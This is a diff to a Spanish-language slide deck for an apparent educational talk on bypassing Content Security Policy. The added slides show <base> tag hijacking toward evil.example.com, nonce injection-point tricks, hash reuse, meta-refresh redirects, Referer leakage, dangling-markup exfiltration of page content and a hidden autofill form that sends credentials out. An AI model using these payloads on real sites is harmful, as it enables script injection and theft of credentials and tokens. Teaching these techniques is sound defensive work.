@@ -661,6 +661,19 @@ function isEven(n) {
       </section>
 
       <section>
+        <h2>Recomendación de Google</h2>
+
+        <img src="img/google-csp-recomendation.png" alt="" class="r-stretch">
+
+        <p>
+          <small>
+            <a
+              href="https://developers.google.com/recaptcha/docs/faq">https://developers.google.com/recaptcha/docs/faq</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
         <h2>Sitio libre de JSON-P</h2>
         <img src="img/later-several-days.png" alt="" class="r-stretch">
       </section>
@@ -693,10 +706,29 @@ function isEven(n) {
         <p>
           https://example.com/login/?next=https://evil.example.com
         </p>
+
+        <p>
+          <small>
+            <a href="examples/07.html" target="_blank">examples/07.html</a>
+          </small>
+        </p>
+
       </section>
 
       <section>
+        <h2>CSP - paths y redirects</h2>
 
+        <blockquote>
+          To avoid leaking path information cross-origin, the matching algorithm ignores the path component
+          of a source expression if the resource being loaded is the result of a redirect.
+        </blockquote>
+
+        <p>
+          <small>
+            <a
+              href="https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects">https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects</a>
+          </small>
+        </p>
       </section>
 
       <section>
@@ -708,7 +740,7 @@ function isEven(n) {
 
         <p>
           <small>
-            <a href="examples/07.html" target="_blank">examples/07.html</a>
+            <a href="examples/08.html" target="_blank">examples/08.html</a>
           </small>
         </p>
 
@@ -736,21 +768,264 @@ function isEven(n) {
 
         <p>
           <small>
-            <a href="examples/08.html" target="_blank">examples/08.html</a>
+            <a href="examples/09.html" target="_blank">examples/09.html</a>
           </small>
         </p>
       </section>
 
       <section>
-        <h2></h2>
+        <h2>¡AngularJS está de vuelta!</h2>
         <p>
-          Ya vimos porque usar una lista de hosts permitidos no es suficiente para prevenir ataques XSS.
+          <small>
+            <a href="examples/10.html" target="_blank">examples/10.html</a>
+          </small>
         </p>
       </section>
 
       <section>
-        hash y nonces
+        <h2>Recomendación de Google</h2>
+
+        <img src="img/google-csp-recomendation-nonce.png" alt="" class="r-stretch">
+
+        <p>
+          <small>
+            <a
+              href="https://developers.google.com/recaptcha/docs/faq">https://developers.google.com/recaptcha/docs/faq</a>
+          </small>
+        </p>
       </section>
+
+      <section>
+        <h2>Conclusión</h2>
+        <p>
+          Usar una lista de hosts permitidos no es suficiente para prevenir ataques XSS.
+        </p>
+      </section>
+
+      <section>
+        <h2>Nonce y hashes</h2>
+        <pre class=""><code data-trim data-noescape class="http">
+          Content-Security-Policy:
+            script-src
+              'nonce-8IBTHwOdqNKAWeKl7plt8g=='
+              'sha256-opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro=';
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/11.html" target="_blank">examples/11.html</a>
+            <br>
+            <a href="examples/12.html" target="_blank">examples/12.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>Ahora si estamos a salvo!</h2>
+        <h3>...o no?</h3>
+      </section>
+
+      <section>
+        <h2>El tag <code>&lt;base&gt;</code></h2>
+
+        <blockquote>
+          The HTML <code>&lt;base&gt;</code> element specifies the base URL to use for all
+          relative URLs contained within a document.
+        </blockquote>
+        <p>
+          <small>
+            <a
+              href="https://devdoc.net/web/developer.mozilla.org/en-US/docs/Web/HTML/Element/base.html">https://devdoc.net/web/developer.mozilla.org/en-US/docs/Web/HTML/Element/base.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>El tag <code>&lt;base&gt;</code></h2>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;base href&equals;&quot;https&colon;&sol;&sol;evil&period;example&period;com&sol;&quot;&gt;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/13.html" target="_blank">examples/13.html</a>
+            <br>
+            <a href="examples/14.html" target="_blank">examples/14.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>Injection point dentro de &lt;script&gt;</h2>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;script nonce&equals;&quot;abc&quot;&gt;
+            &lcub;INJECTION&rcub;
+          &lt;&sol;script&gt;
+        </code></pre>
+      </section>
+
+      <section>
+        <h2>Injection point entre nonce y src</h2>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;script nonce&equals;&quot;abc&quot; &lcub;INJECTION&rcub; src&equals;&quot;good&period;js&quot;&gt;&lt;&sol;script&gt;
+        </code></pre>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;script nonce&equals;&quot;abc&quot; src&equals;&quot;https&colon;&sol;&sol;example&period;com&sol;evil&period;js&quot;&gt;
+          &lt;&sol;script&gt;&quot; src&equals;&quot;good&period;js&quot;&gt;&lt;&sol;script&gt;
+        </code></pre>
+      </section>
+
+      <section>
+        <h2>Injection point antes del nonce</h2>
+        <p>Nonce semi-dinámico, el nonce es único por usuario o sesión en lugar de por request.</p>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lcub;INJECTION&rcub;
+          &lt;script nonce&equals;&quot;abc&quot; src&equals;&quot;good&period;js&quot;&gt;&lt;&sol;script&gt;
+        </code></pre>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;img src&equals;&apos;https&colon;&sol;&sol;example&period;com&sol;
+          &lt;script nonce&equals;&quot;abc&quot; src&equals;&quot;good&period;js&quot;&gt;&lt;&sol;script&gt;
+        </code></pre>
+      </section>
+
+      <section>
+        <h2>Re-uso de contenido de hashes</h2>
+
+        <p>
+          Si la política CSP permite inline scripts que corresponden a un hash específico,
+          el atacante también puede hacer uso de ese mismo contenido.
+        </p>
+
+        <pre class=""><code data-trim data-noescape class="http">
+          Content-Security-Policy:
+            script-src
+              'sha256-lZiRtFqX8+/xK+BIpUJiYLvM8k3Hmw2Lb+Efx61lknA=';
+        </code></pre>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;a onclick&equals;&quot;deleteAccount&lpar;&rpar;&quot;&gt;Delete account&lt;&sol;a&gt;
+        </code></pre>
+      </section>
+
+      <section>
+        <h2>
+          Malas implementaciones de nonce
+        </h2>
+
+        <ul>
+          <li>Nonce estático o predecible</li>
+          <li>Nonce semi-dinámico</li>
+          <li>Inyectar el nonce automáticamente en cada script</li>
+        </ul>
+      </section>
+
+
+      <section>
+        <h2>Otras maneras de generar impacto sin ejecutar JS</h2>
+
+        <ul>
+          <li>Manipulación del contenido</li>
+          <li>Redirecciones</li>
+          <li>Exfiltración de información</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Redirecciones</h2>
+
+        <ul>
+          <li>Redireccionamiento a un sitio malicioso</li>
+          <li>Prevenir acceso al sitio</li>
+        </ul>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;meta http-equiv&equals;&quot;refresh&quot; content&equals;&quot;0&semi; url&equals;https&colon;&sol;&sol;example&period;com&sol;&quot; &sol;&gt;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/15.html?code=12345" target="_blank">examples/15.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>Filtración de URL via referer</h2>
+        <p>
+          Cuando se carga un recurso de un sitio, el navegador envía el header Referer con la URL
+          del sitio que hizo la petición. La URL puede contener información sensible (OAuth tokens).
+        </p>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;img src&equals;&quot;https&colon;&sol;&sol;example&period;com&sol;&quot; referrerpolicy&equals;&quot;unsafe-url&quot;&gt;
+        </code></pre>
+        <p>
+          <small>
+            <a
+              href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy</a>
+            <br>
+            <br>
+            <a href="examples/16.html?code=12345" target="_blank">examples/16.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>Filtración del contenido de la página</h2>
+        <p>
+          El atacante puede inyectar un recurso entre comillas sin cerrar,
+          el navegador interpretará el contenido de la página como parte del recurso,
+          hasta que encuentre el cierre de las comillas.
+        </p>
+
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;img src&equals;&apos;https&colon;&sol;&sol;example&period;com&sol;
+        </code></pre>
+        <p>
+          <small>
+            <a href="examples/17.html" target="_blank">examples/17.html</a>
+            <br>
+            <a href="examples/18.html" target="_blank">examples/18.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>Filtración de credenciales</h2>
+        <p>
+          Un atacante puede inyectar un formulario oculto en la página.
+          El gestor de contraseñas puede llenarlo automáticamente.
+          Si el usuario envía el formulario, el atacante recibirá las credenciales.
+        </p>
+      </section>
+
+      <section>
+        <h2>Filtración de credenciales</h2>
+        <pre class=""><code data-trim data-noescape class="html">
+          &lt;form action&equals;&quot;https&colon;&sol;&sol;example&period;com&sol;&quot;&gt;
+            &lt;input name&equals;&quot;email&quot; style&equals;&quot;opacity&colon;0&semi;width&colon;0&quot;&gt;
+            &lt;input type&equals;&quot;password&quot; name&equals;&quot;password&quot; style&equals;&quot;opacity&colon;0&semi;width&colon;0&quot;&gt;
+            &lt;input type&equals;&quot;submit&quot; value&equals;&quot;Click me&excl;&quot;&gt;
+          &lt;&sol;form&gt;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/19.html" target="_blank">examples/19.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>Una buena política</h2>
+      </section>
+
 
       <section data-transition="zoom">
         <h2>Frase para terminar la charla</h2>
